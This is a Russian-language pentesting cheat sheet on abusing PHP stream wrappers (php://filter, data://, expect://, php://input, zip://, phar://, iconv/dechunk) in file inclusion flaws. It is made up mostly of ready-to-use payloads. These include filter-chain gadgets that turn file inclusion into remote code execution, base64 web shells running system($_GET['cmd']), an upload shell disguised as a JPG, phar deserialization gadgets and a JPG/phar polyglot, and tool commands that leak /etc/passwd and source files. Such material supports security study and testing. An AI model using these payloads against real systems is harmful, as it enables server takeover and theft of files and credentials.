* [Wrapper php://filter](#Wrapper-php-filter)
* [Wrapper data://](Wrapper-data)
* [Wrapper expect://](#Wrapper-expect)
* [Wrapper input://](#Wrapper-input)
* [Wrapper zip://](#Wrapper-zip)
* [Wrapper phar://](#Wrapper-phar)
   * [Структура PHAR архива](#Структура-PHAR-архива)
   * [Десериализация PHAR](#Десериализация-PHAR)
* [Wrapper convert.iconv:// и dechunk://](#Wrapper-converticonv-и-dechunk)
   * [Утечка содержимого файла через оракул на основе ошибок](#Утечка-содержимого-файла-через-оракул-на-основе-ошибок)
   * [Утечка содержимого файла внутри пользовательского формата вывода](#Утечка-содержимого-файла-внутри-пользовательского-формата-вывода)
   * [Утечка содержимого файла с использованием примитива слепого чтения файлов](#Утечка-содержимого-файла-с-использованием-примитива-слепого-чтения-файлов)
* [URL](#URL)

> Wrapper в контексте уязвимостей включения файлов относится к протоколу или методу, используемому для доступа или включения файла.
>> Wrappers часто используются в PHP или других серверных языках для расширения функциональности включения файлов, позволяя использовать протоколы, такие как HTTP, FTP и другие, в дополнение к локальной файловой системе.

* **Простая аналогия**
    * Локальный файл ```/var/www/index.php``` = Взять книгу с полки в своей комнате.
    * HTTP wrapper ```http://example.com/data.txt``` = Съездить на велосипеде в другую библиотеку по специальному адресу (URL) и привезти книгу оттуда.
    * FTP wrapper ```ftp://example.com/file.zip``` = Воспользоваться грузовиком, чтобы забрать тяжелую папку с документами со специального файлового сервера.
    * ```php://filter``` = Взять книгу с полки, но надеть на себя специальные очки (фильтр), которые, например, переводят весь текст в нейтральный стиль (rot13) или шифруют его в формат, понятный только машинам (base64), прежде чем начать читать.

# Wrapper php://filter

* Часть ```"php://filter"``` **нечувствительна к регистру**.
* php://filter и data:// часто работают вместе

|Фильтр|Описание|
|:--------:|:----------:|
|```php://filter/read=string.rot13/resource=index.php```|Отображает index.php в кодировке rot13|
|```php://filter/convert.iconv.utf-8.utf-16/resource=index.php``` |	Кодирует index.php из utf8 в utf16|
|```php://filter/convert.base64-encode/resource=index.php```|Отображает index.php в виде строки в кодировке base64|

```python
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

Wrappers можно объединять в цепочку с wrapper'ом сжатия для больших файлов.

```python
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

ПРИМЕЧАНИЕ: Wrappers можно объединять несколько раз с помощью | или /:

* Множественное декодирование base64: ```php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s```
* deflate, затем base64encode (полезно для эксфильтрации с ограниченным набором символов): ```php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php```

```python
./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```
Также существует способ превратить ```php://filter``` в полноценный RCE.

* [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) - CLI для генерации цепочек PHP фильтров
  
```python
$ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
[+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
* [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/LFI2RCE.py) - для генерации пользовательского полезная нагрузка.

```php
# уязвимый файл: index.php
# уязвимый параметр: file
# выполняемая команда: id
# выполняемый PHP код: <?=`$_GET[0]`;;?>
curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd"
```

# Wrapper data://

Полезная нагрузка в кодировке base64: ```"<?php system($_GET['cmd']);echo 'Shell done !'; ?>"```.

```python
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

Забавный факт: можно вызвать XSS и обойти Chrome Auditor с помощью: ```http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+```

# Wrapper expect://

При использовании в PHP или подобном приложении, может позволить выполнять команды в системной оболочке, так как wrapper expect:// может вызывать команды оболочки как часть своего ввода.

```python
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

# Wrapper input://

Укажи полезную нагрузку в параметрах POST, это можно сделать с помощью curl.

```bash
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

В качестве альтернативы, Kadimus имеет модуль для автоматизации этой атаки.

```bash
./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
```

# Wrapper zip://

* Payload: ```echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php```;

* Заархивируй файл:

```bash
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php
```

* Загрузи архив и получите доступ к файлу с помощью wrapper'ов:

```bash
http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

# Wrapper phar://

## Структура PHAR архива

Файлы PHAR работают как ZIP-файлы, и можно использовать phar:// для доступа к файлам, хранящимся внутри них.

* Создай phar-архив, содержащий файл-бэкдор: php --define phar.readonly=0 archive.php

```php
<?php
  $phar = new Phar('archive.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
  $phar->setStub('<?php __HALT_COMPILER(); ?>');
  $phar->stopBuffering();
?>
```
* Используйте wrapper ```phar://: curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt```

## Десериализация PHAR

⚠️ **Эта техника не работает на PHP 8+, десериализация была удалена.**

> Если операция с файлом выполняется на нашем существующем phar-файле через wrapper phar://, то его сериализованные метаданные десериализуются. 
>> Эта уязвимость возникает в следующих функциях, включая ```file_exists: include```, ```file_get_contents```, ```file_put_contents```, ```copy```, ```file_exists```, ```is_executable```, ```is_file```, ```is_dir```, ```is_link```, ```is_writable```, ```fileperms```, ```fileinode```, ```filesize```, ```fileowner```, ```filegroup```, ```fileatime```, ```filemtime```, ```filectime```, ```filetype```, ```getimagesize```, ```exif_read_data```, ```stat```, ```lstat```, ```touch```, ```md5_file```, и т.д.

* Для этого эксплойта требуется хотя бы один класс с магическими методами, такими как __destruct() или __wakeup(). Возьмем в качестве примера этот класс AnyClass, который выполняет параметр data.

```php
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}

...
echo file_exists($_GET['page']);
```

* Можно создать phar-архив, содержащий сериализованный объект в своих метаданных.

```php
// создаем новый Phar
$phar = new Phar('deser.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// добавляем объект любого класса в качестве метаданных
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```

Вызови wrapper ```phar: curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar```

**ПРИМЕЧАНИЕ**: Можно использовать ```$phar->setStub()```, чтобы добавить магические байты JPG файла: ```\xff\xd8\xff```

```php
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
```

* **Poyglot jpg->phar**

```php
<?php
class CustomTemplate {}
class Blog {}

if (ini_get('phar.readonly')) {
    die("Run: php -d phar.readonly=0 " . basename(__FILE__) . "\n");
}

$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}';
$blog->user = 'user';
$object->template_file_path = $blog;

// Создаем реальный минимальный JPEG (1x1 pixel)
$jpg = base64_decode('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAA8U/9k=');

@unlink('evil.phar');

$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub($jpg . '<?php __HALT_COMPILER(); ?>');
$phar->addFromString('test.txt', 'test');
$phar->setMetadata($object);
$phar->stopBuffering();

copy('evil.phar', 'evil.jpg');
@unlink('evil.phar');

?>
```

# Wrapper convert.iconv:// и dechunk://

### Утечка содержимого файла через оракул на основе ошибок

```convert.iconv://```: преобразует ввод в другую кодировку (convert.iconv.utf-16le.utf-8)
```dechunk://```: если строка не содержит символов новой строки, она полностью очистит строку, если и только если строка начинается с A-Fa-f0-9

Цель этой эксплуатации - утечка содержимого файла по одному символу за раз, на основе writeup от [DownUnderCTF](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py).

Требования:

* Бэкенд не должен использовать file_exists или is_file.
* Уязвимый параметр должен быть в POST-запросе.
      * Из-за ограничения по размеру эксфильтрация ограничена не более 135 символами в GET-запросе. 

Цепочка эксплойта основана на PHP фильтрах: iconv и dechunk:

1. Используй фильтр ```iconv``` с кодировкой, экспоненциально увеличивающей размер данных, чтобы вызвать ошибку памяти.
2. Используй фильтр ```dechunk```, чтобы определить первый символ файла, на основе предыдущей ошибки.
3. Снова используй фильтр ```iconv``` с кодировками, имеющими разный порядок байтов, чтобы поменять местами оставшиеся символы с первым.

Эксплойт с использованием [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit), скрипт будет использовать либо код состояния HTTP: 500, либо время в качестве оракула на основе ошибок для определения символа.

```python
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0
[*] The following URL is targeted : http://127.0.0.1
[*] The following local file is leaked : /test
[*] Running POST requests
[+] File /test leak is finished!
```

## Утечка содержимого файла внутри пользовательского формата вывода

[ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - Генерирует цепочку php://filter, которая добавляет префикс и суффикс к содержимому файла.

Чтобы получить содержимое некоторого файла, необходимо иметь: {"message":"<содержимое файла>"}.

```bash
./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
```

Это можно использовать против уязвимого кода, подобного следующему.

```php
<?php
  $data = file_get_contents($_POST['url']);
  $data = json_decode($data);
  echo $data->message;
?>
```

## Утечка содержимого файла с использованием примитива слепого чтения файлов

* [ambionics/lightyear](https://github.com/ambionics/lightyear)

```python
code remote.py # отредактируйте Remote.oracle
./lightyear.py test # проверьте, что ваша реализация работает
./lightyear.py /etc/passwd # сдампите файл!
```

# URL

* [решение таска "Includer's Revenge" из hxp CTF 2021 без контроля над файлами. ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)
* [php-filters-chain-what-is-it-and-how-to-use-it](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
* [php-filter-chains-file-read-from-error-based-oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)
* [wrapwrap-php-filters-suffix](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix)
* [lightyear-file-dump](https://www.ambionics.io/blog/lightyear-file-dump)
* [iconv-cve-2024-2961-p1](https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html)
